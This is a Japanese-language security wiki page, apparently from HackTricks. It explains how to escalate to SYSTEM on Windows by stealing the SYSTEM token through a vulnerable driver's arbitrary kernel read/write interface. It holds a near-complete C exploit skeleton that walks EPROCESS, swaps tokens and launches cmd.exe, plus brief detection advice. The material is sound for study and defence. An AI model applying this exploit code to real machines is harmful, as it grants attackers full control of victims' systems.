# Windows kernel EoP: arbitrary kernel R/W による Token stealing

{{#include ../../banners/hacktricks-training.md}}

## 概要

脆弱な driver が attacker に arbitrary kernel read and/or write primitives を提供する IOCTL を公開している場合、SYSTEM access token を盗むことで NT AUTHORITY\SYSTEM への privilege escalation を実現できることがあります。この technique では、SYSTEM process の EPROCESS から Token pointer を current process の EPROCESS へコピーします。<sup>[[2]](#references)</sup>

これが機能する理由:
- 各 process には EPROCESS structure があり、その中には（その他の field とともに）Token（実際には token object への EX_FAST_REF）が含まれています。
- SYSTEM process（PID 4）は、すべての privilege が有効になった token を保持しています。
- 現在の process の EPROCESS.Token を SYSTEM token pointer に置き換えると、現在の process は直ちに SYSTEM として実行されます。<sup>[[1]](#references)</sup>

> EPROCESS 内の offset は Windows version によって異なります。動的に（symbols を使用して）特定するか、version 固有の定数を使用してください。また、EPROCESS.Token は EX_FAST_REF であることにも注意してください（下位 3 bit は reference count flag です）。

## 概要レベルの手順

1) ntoskrnl.exe の base を特定し、PsInitialSystemProcess の address を解決します。
- user mode から、NtQuerySystemInformation(SystemModuleInformation) または EnumDeviceDrivers を使用して、loaded driver の base を取得します。
- PsInitialSystemProcess の offset（symbols/reversing から取得）を kernel base に加算し、その address を取得します。
2) PsInitialSystemProcess の pointer を読み取ります → これは SYSTEM の EPROCESS への kernel pointer です。
3) SYSTEM EPROCESS から UniqueProcessId と ActiveProcessLinks の offset を読み取り、EPROCESS structure の doubly linked list（ActiveProcessLinks.Flink/Blink）を辿り、UniqueProcessId が GetCurrentProcessId() と等しい EPROCESS を見つけます。以下の両方を保持します:
- EPROCESS_SYSTEM（SYSTEM 用）
- EPROCESS_SELF（current process 用）
4) SYSTEM token の value を読み取ります: Token_SYS = *(EPROCESS_SYSTEM + TokenOffset)。
- 下位 3 bit を mask します: Token_SYS_masked = Token_SYS & ~0xF（build によっては一般的に ~0xF または ~0x7。x64 では下位 3 bit が使用されます — 0xFFFFFFFFFFFFFFF8 mask）。
5) Option A（一般的）: 現在の token の下位 3 bit を保持し、それを SYSTEM の pointer に結合して、埋め込み ref count の整合性を維持します。
- Token_ME = *(EPROCESS_SELF + TokenOffset)
- Token_NEW = (Token_SYS_masked | (Token_ME & 0x7))
6) kernel write primitive を使用して、Token_NEW を (EPROCESS_SELF + TokenOffset) に書き戻します。
7) 現在の process は SYSTEM になっています。必要に応じて新しい cmd.exe または powershell.exe を spawn して確認します。<sup>[[1]](#references)</sup>

## Pseudocode

以下は、vulnerable driver の 2 つの IOCTL（8-byte kernel read 用と 8-byte kernel write 用）のみを使用する skeleton です。使用する driver の interface に置き換えてください。<sup>[[1]](#references)</sup>
```c
#include <Windows.h>
#include <Psapi.h>
#include <stdint.h>

// Device + IOCTLs are driver-specific
#define DEV_PATH   "\\\\.\\VulnDrv"
#define IOCTL_KREAD  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_KWRITE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)

// Version-specific (examples only – resolve per build!)
static const uint32_t Off_EPROCESS_UniquePid    = 0x448; // varies
static const uint32_t Off_EPROCESS_Token        = 0x4b8; // varies
static const uint32_t Off_EPROCESS_ActiveLinks  = 0x448 + 0x8; // often UniquePid+8, varies

BOOL kread_qword(HANDLE h, uint64_t kaddr, uint64_t *out) {
struct { uint64_t addr; } in; struct { uint64_t val; } outb; DWORD ret;
in.addr = kaddr; return DeviceIoControl(h, IOCTL_KREAD, &in, sizeof(in), &outb, sizeof(outb), &ret, NULL) && (*out = outb.val, TRUE);
}
BOOL kwrite_qword(HANDLE h, uint64_t kaddr, uint64_t val) {
struct { uint64_t addr, val; } in; DWORD ret;
in.addr = kaddr; in.val = val; return DeviceIoControl(h, IOCTL_KWRITE, &in, sizeof(in), NULL, 0, &ret, NULL);
}

// Get ntoskrnl base (one option)
uint64_t get_nt_base(void) {
LPVOID drivers[1024]; DWORD cbNeeded;
if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded >= sizeof(LPVOID)) {
return (uint64_t)drivers[0]; // first is typically ntoskrnl
}
return 0;
}

int main(void) {
HANDLE h = CreateFileA(DEV_PATH, GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
if (h == INVALID_HANDLE_VALUE) return 1;

// 1) Resolve PsInitialSystemProcess
uint64_t nt = get_nt_base();
uint64_t PsInitialSystemProcess = nt + /*offset of symbol*/ 0xDEADBEEF; // resolve per build

// 2) Read SYSTEM EPROCESS
uint64_t EPROC_SYS; kread_qword(h, PsInitialSystemProcess, &EPROC_SYS);

// 3) Walk ActiveProcessLinks to find current EPROCESS
DWORD myPid = GetCurrentProcessId();
uint64_t cur = EPROC_SYS; // list is circular
uint64_t EPROC_ME = 0;
do {
uint64_t pid; kread_qword(h, cur + Off_EPROCESS_UniquePid, &pid);
if ((DWORD)pid == myPid) { EPROC_ME = cur; break; }
uint64_t flink; kread_qword(h, cur + Off_EPROCESS_ActiveLinks, &flink);
cur = flink - Off_EPROCESS_ActiveLinks; // CONTAINING_RECORD
} while (cur != EPROC_SYS);

// 4) Read tokens
uint64_t tok_sys, tok_me;
kread_qword(h, EPROC_SYS + Off_EPROCESS_Token, &tok_sys);
kread_qword(h, EPROC_ME  + Off_EPROCESS_Token, &tok_me);

// 5) Mask EX_FAST_REF low bits and splice refcount bits
uint64_t tok_sys_mask = tok_sys & ~0xF; // or ~0x7 on some builds
uint64_t tok_new = tok_sys_mask | (tok_me & 0x7);

// 6) Write back
kwrite_qword(h, EPROC_ME + Off_EPROCESS_Token, tok_new);

// 7) We are SYSTEM now
system("cmd.exe");
return 0;
}
```
注意:
- オフセット: 正しいオフセットを取得するには、対象の PDB とともに WinDbg の `dt nt!_EPROCESS` を使用するか、runtime symbol loader を使用してください。オフセットを盲目的にハードコードしないでください。
- Mask: x64 では token は EX_FAST_REF です。下位 3 ビットは reference count bits です。token の元の下位ビットを保持すると、即時の refcount の不整合を回避できます。
- Stability: 現在のプロセスを elevate することを優先してください。短時間で終了する helper を elevate すると、そのプロセスの終了時に SYSTEM を失う可能性があります。<sup>[[1]](#references)</sup>

## Detection & mitigation
- 強力な IOCTL を公開する、unsigned または untrusted な third-party driver のロードが根本原因です。
- Kernel Driver Blocklist (HVCI/CI)、DeviceGuard、Attack Surface Reduction rules により、vulnerable driver のロードを防止できます。
- EDR は、arbitrary read/write を実装する suspicious な IOCTL sequences や token swaps を監視できます。

## References

- [1] [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [2] [FuzzySecurity – Windows Kernel ExploitDev (token stealing examples)](https://www.fuzzysecurity.com/tutorials/expDev/17.html)

{{#include ../../banners/hacktricks-training.md}}
